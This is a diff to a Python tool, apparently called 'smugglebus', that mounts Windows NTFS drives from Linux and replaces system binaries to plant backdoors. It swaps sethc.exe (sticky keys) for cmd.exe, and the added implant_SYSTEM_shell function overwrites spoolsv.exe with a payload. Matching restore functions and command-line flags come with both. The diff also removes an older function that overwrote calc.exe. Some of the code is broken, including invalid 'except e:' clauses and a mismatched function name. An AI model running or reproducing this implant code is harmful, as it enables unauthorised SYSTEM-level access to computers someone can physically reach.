@@ -11,6 +11,14 @@ import sys, subprocess, argparse, time, shutil, os, datetime
 
 
 class Drive:
+# Stored stat from a raw drive in a more accessible format.
+# set_source sets the path that the drive is located at
+# set_fs stores the file system for the drive
+# get_source returns the path that the drive is located at
+# is_mounted checks to see if the drive is mounted or not
+    # If the drive is mounted 'yes' is returned
+    # If the drive is not mounted 'no' is returned
+    # THIS IS DUMB AS SHIT AND SHOULD BE A BOOLEAN
 
     def __init__(self):
         self.source = '' 
@@ -34,8 +42,9 @@ class Drive:
             return 'no'
 
 
-#Run the command sudo blkid and then recieve its output as a bytes
-#Decode using utf-8 and then split on \n
+# Run the command sudo blkid and then recieve its output as a bytes
+# Decode using utf-8 and then split on \n
+# Returns a list of drive paths and their file systems
 def grab_drives():
     proc = subprocess.Popen('sudo blkid', stdout=subprocess.PIPE, 
             shell=True)
@@ -44,7 +53,7 @@ def grab_drives():
     return drives
 
 # extracts the drives with ntfs types
-# make Modular for inclusion of *nix systems?
+# returns a list of windows drives
 def locate_winfs(drives):
     win_drives = []
     for drive in drives:
@@ -53,9 +62,9 @@ def locate_winfs(drives):
     return win_drives
  
 def mount_drive(drive):
-    #should refactor to accept input for /media/drivetype 
-    # to exploit different file systems got rid of /etc/services 
-    # from mount command. Don't think I need it
+    # accepts a path to a drive that you would like to mount
+    # mounts the target drive to /mna/windows
+    # if /windows does not exist, smugglebus will try to make it for you
     try:
         os.mkdir('/mnt/windows')
         print('/mnt/windows has been created for you, and will'
@@ -72,8 +81,17 @@ def mount_drive(drive):
     time.sleep(1)
 
 
+# Not the best code but it works
+# Need to figure out a way to write a single function that serves the purpose
+# of all the locate*() functions. For now this works. The general reason these
+# functions exist is because different versions of windows capitalize directory
+# names differently. So in simple terms these functions use the lower-case
+# version of a directory name , and compare it to what 
+# os.listdir().casefold(). This lowercases both sides of the search.
+# Then if a match is found, we take and store what is returned from os.listdir()
 def locate_sticky_keyz():
-    # gotta make this shit find stickykeys exe on any windows machine
+    
+
     target_directories = dict()
     base_dir = os.listdir('/mnt/windows')
     
@@ -96,11 +114,6 @@ def locate_sticky_keyz():
 
         
     return target_directories 
-
-
-
-
-
 
 def locate_registry_paths():
     #target_directories = ['windows', 'system32', 'config']
@@ -177,75 +190,6 @@ def locate_cmd():
         
     return target_directories 
 
-
-def get_sticky_shell():
-
-        # gotta use the mount point made by mount_drive here from the 
-        # user input i should implement some code that suggests a drive 
-        # to choose based off of mounting other ones and lsing
-        # them. This will be slow but very cool
-        target_paths = locate_sticky_keyz()
-        #print(os.listdir('/mnt/windows/{}/{}'.format(target_paths["windows"], 
-        #        target_paths["system32"])))
-        
-        #stamp = str(datetime.datetime.now().timestamp())
-        #directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
-        #os.mkdir(directory) 
-        #print('/mnt/windows/{}/{}/{}'.format(
-        #        target_paths["windows"], 
-        #        target_paths["system32"],
-        #        target_paths["sethc"]))
-    
-    
-        try:
-            shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
-                target_paths["windows"], 
-                target_paths["system32"],
-                target_paths["sethc"]), 
-
-                '/mnt/windows/{}/{}/{}.bak'.format(
-                target_paths["windows"], 
-                target_paths["system32"],
-                target_paths["sethc"]))
-
-        except FileNotFoundError as e:
-            print(e)
-            print('/mnt/windows/{}/{}/{} was not found'.format(
-                target_paths["windows"], 
-                target_paths["system32"],
-                target_paths["sethc"]))
-
-        target_paths = locate_cmd()
-
-        print(target_paths)
-        try:
-            shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
-                target_paths["windows"], 
-                target_paths["system32"],
-                target_paths["cmd"]), 
-
-                '/mnt/windows/{}/{}/sethc.exe'.format(
-                target_paths["windows"], 
-                target_paths["system32"]))
-
-        except FileNotFoundError as e:
-            print(e)
-            print('/mnt/windows/{}/{}/{} was not found'.format(
-                target_paths["windows"], 
-                target_paths["system32"],
-                target_paths["cmd"]))
-
-
-
-
-
-        print('stickykeyz binary has been succesfully swapped with cmd.exe')
-        # optimize this...
-        time.sleep(1)
-        subprocess.Popen('sudo umount /mnt/windows', shell=True)
-        print('Drive has been unmounted from /mnt/windows')
-
-
 def locate_sticky_keyzbak():
     # gotta make this shit find stickykeys exe on any windows machine
     target_directories = dict()
@@ -267,63 +211,214 @@ def locate_sticky_keyzbak():
             targets.append('{}/{}/{}'.format(target_directories["windows"], 
                 target_directories["system32"],
                 target_directories["sethc"]))
-
-        
     return target_directories 
 
 
+def get_sticky_shell():
+
+    # gotta use the mount point made by mount_drive here from the 
+    # user input i should implement some code that suggests a drive 
+    # to choose based off of mounting other ones and lsing
+    # them. This will be slow but very cool
+    target_paths = locate_sticky_keyz()
+    #print(os.listdir('/mnt/windows/{}/{}'.format(target_paths["windows"], 
+    #        target_paths["system32"])))
+    
+    #stamp = str(datetime.datetime.now().timestamp())
+    #directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
+    #os.mkdir(directory) 
+    #print('/mnt/windows/{}/{}/{}'.format(
+    #        target_paths["windows"], 
+    #        target_paths["system32"],
+    #        target_paths["sethc"]))
+    
+    
+    try:
+        shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["sethc"]), 
+
+            '/mnt/windows/{}/{}/{}.bak'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["sethc"]))
+
+    except FileNotFoundError as e:
+        print(e)
+        print('/mnt/windows/{}/{}/{} was not found'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["sethc"]))
+
+    target_paths = locate_cmd()
+
+    print(target_paths)
+    try:
+        shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["cmd"]), 
+
+            '/mnt/windows/{}/{}/sethc.exe'.format(
+            target_paths["windows"], 
+            target_paths["system32"]))
+
+    except FileNotFoundError as e:
+        print(e)
+        print('/mnt/windows/{}/{}/{} was not found'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["cmd"]))
+
+
+    print('stickykeyz binary has been succesfully swapped with cmd.exe')
+    # optimize this...
+    time.sleep(1)
+    subprocess.Popen('sudo umount /mnt/windows', shell=True)
+    print('Drive has been unmounted from /mnt/windows')
 
 
 
 def revert_sticky_shell():
-
-        # gotta use the mount point made by mount_drive here from the 
-        # user input i should implement some code that suggests a drive 
-        # to choose based off of mounting other ones and lsing
-        # them. This will be slow but very cool
-        target_paths = locate_sticky_keyzbak()
-        #print(os.listdir('/mnt/windows/{}/{}'.format(target_paths["windows"], 
-        #        target_paths["system32"])))
-        
-        #stamp = str(datetime.datetime.now().timestamp())
-        #directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
-        #os.mkdir(directory) 
-        #print('/mnt/windows/{}/{}/{}'.format(
-        #        target_paths["windows"], 
-        #        target_paths["system32"],
-        #        target_paths["sethc"])) 
+    # gotta use the mount point made by mount_drive here from the 
+    # user input i should implement some code that suggests a drive 
+    # to choose based off of mounting other ones and lsing
+    # them. This will be slow but very cool
+    target_paths = locate_sticky_keyzbak()
+    #print(os.listdir('/mnt/windows/{}/{}'.format(target_paths["windows"], 
+    #        target_paths["system32"])))
     
-        try:
-            shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
+    #stamp = str(datetime.datetime.now().timestamp())
+    #directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
+    #os.mkdir(directory) 
+    #print('/mnt/windows/{}/{}/{}'.format(
+    #        target_paths["windows"], 
+    #        target_paths["system32"],
+    #        target_paths["sethc"])) 
+    
+    try:
+        shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["sethc"]), 
+
+            '/mnt/windows/{}/{}/{}'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["sethc"].replace('.bak', '')))
+
+    except FileNotFoundError as e:
+        print(e)
+        print('/mnt/windows/{}/{}/{} was not found'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["sethc"]))
+
+    os.remove('/mnt/windows/{}/{}/{}'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["sethc"])) 
+
+    print('stickykeyz binary has been succesfully restored')
+    # optimize this...
+    time.sleep(1)
+    subprocess.Popen('sudo umount /mnt/windows', shell=True)
+    print('Drive has been unmounted from /mnt/windows')
+
+def locate_spoolsv():
+    # gotta make this shit find stickykeys exe on any windows machine
+    target_directories = dict()
+    base_dir = os.listdir('/mnt/windows')
+    
+    targets = []
+    for next_dir in base_dir:
+        if 'windows' == next_dir.casefold():
+            target_directories['windows'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}'.format(
+            target_directories['windows'])):
+        if 'system32' == next_dir.casefold():
+            target_directories['system32'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
+            target_directories['windows'], 
+            target_directories['system32'])):
+        if 'spoolsv.exe' == next_dir.casefold():
+            target_directories['spoolsv']  = next_dir
+            targets.append('{}/{}/{}'.format(target_directories["windows"], 
+                target_directories["system32"],
+                target_directories["spoolsv"]))
+    return target_directories 
+
+
+def locate_spoolsv_bak():
+    target_directories = dict()
+    base_dir = os.listdir('/mnt/windows')
+    
+    targets = []
+    for next_dir in base_dir:
+        if 'windows' == next_dir.casefold():
+            target_directories['windows'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}'.format(
+            target_directories['windows'])):
+        if 'system32' == next_dir.casefold():
+            target_directories['system32'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
+            target_directories['windows'], 
+            target_directories['system32'])):
+        if 'spoolsv.exe.bak' == next_dir.casefold():
+            target_directories['spoolsv']  = next_dir
+            targets.append('{}/{}/{}'.format(target_directories["windows"], 
+                target_directories["system32"],
+                target_directories["spoolsv"]))
+    return target_directories 
+
+
+def implant_SYSTEM_shell():
+    target_paths = locate_spoolsv()
+    
+    try:
+        shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["spoolsv"]), 
+
+            '/mnt/windows/{}/{}/{}.bak'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["spoolsv"]))
+
+    except FileNotFoundError as e:
+        print(e)
+        print('/mnt/windows/{}/{}/{} was not found'.format(
                 target_paths["windows"], 
                 target_paths["system32"],
-                target_paths["sethc"]), 
+                target_paths["spoolsv"]))
+    try:
 
-                '/mnt/windows/{}/{}/{}'.format(
-                target_paths["windows"], 
-                target_paths["system32"],
-                target_paths["sethc"].replace('.bak', '')))
+        shutil.copyfile('/home/tc/payloads/spoolsv.exe', 
 
-        except FileNotFoundError as e:
-            print(e)
-            print('/mnt/windows/{}/{}/{} was not found'.format(
-                target_paths["windows"], 
-                target_paths["system32"],
-                target_paths["sethc"]))
+            '/mnt/windows/{}/{}/spoolsv.exe'.format(
+            target_paths["windows"], 
+            target_paths["system32"]))
+    except e:
+        print(e)
+def remove_SYSTEM_shell():
+    target_paths = locate_spoolsv_bak()
+    try:
+        shutil.copyfile('/mnt/windows/{}/{}/{}.bak'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["spoolsv"]), 
 
-        os.remove('/mnt/windows/{}/{}/{}'.format(
-                target_paths["windows"], 
-                target_paths["system32"],
-                target_paths["sethc"])) 
+            '/mnt/windows/{}/{}/{}'.format(
+            target_paths["windows"], 
+            target_paths["system32"],
+            target_paths["spoolsv"].replace('.bak', '')))
 
-
-
-
-        print('stickykeyz binary has been succesfully restored')
-        # optimize this...
-        time.sleep(1)
-        subprocess.Popen('sudo umount /mnt/windows', shell=True)
-        print('Drive has been unmounted from /mnt/windows')
+    except e:
+        print(e)
+def implant_userland_shell():
+    pass
 
 
 
@@ -397,23 +492,6 @@ def check_for_windrives(raw_drives):
         mount_drive(win_drives[int(target)])
         return True
 
-def implant_malware():
-    try:
-        # I need to implemnt something instead of hardcoding 
-        # /media/windows
-        shutil.copyfile('/media/windows/Windows/System32/calc.exe', 
-                '/media/windows/Windows/System32/calc.exe.bak')
-        shutil.copyfile('/calc.exe', 
-                '/media/windows/Windows/System32/')
-        print('[*] payload has been uploaded to the host')
-    except FileNotFoundError:
-        print('drive not exploitable')
-
-    subprocess.Popen('sudo umount /media/windows', shell=True)
-
-
-
-
 
 
 def pretty_print(drives):
@@ -463,6 +541,8 @@ def main():
     group.add_argument('-pd', '--print_drives', action='store_true')
     group.add_argument('-sk', '--sticky_keyz', action='store_true')
     group.add_argument('-rsk', '--remove_sticky_keyz', action='store_true')
+    group.add_argument('-rss', '--remove_system_shell', action='store_true')
+    group.add_argument('-ss', '--system_shell', action='store_true')
 
     args = parser.parse_args()
 
@@ -482,8 +562,12 @@ def main():
     elif args.remove_sticky_keyz:
         if check_for_windrives(raw_drives):
             revert_sticky_shell()
-
-
+    elif args.system_shell:
+        if check_for_windrives(raw_drives):
+            implant_SYSTEM_shell()
+    elif args.remove_system_shell:
+        if check_for_windrives(raw_drives):
+            remove_system_shell()
 #    elif args.implant:
 #        if check_for_windrives(raw_drives):
 #            implant_malware()
